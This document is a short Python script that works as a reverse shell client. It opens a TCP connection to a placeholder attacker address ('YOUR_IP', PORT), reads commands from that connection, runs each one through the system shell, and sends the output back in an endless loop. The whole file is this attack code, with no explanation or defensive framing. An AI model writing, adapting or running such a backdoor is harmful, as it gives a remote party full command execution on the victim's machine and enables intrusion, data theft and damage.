import socket
import subprocess

def exec_command(command):
    return subprocess.check_output(command, shell=True)


con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
con.connect(("YOUR_IP", PORT))

while True:
    command = con.recv(1024).decode()
    command_result = exec_command(command)
    con.send(command_result)

con.close()
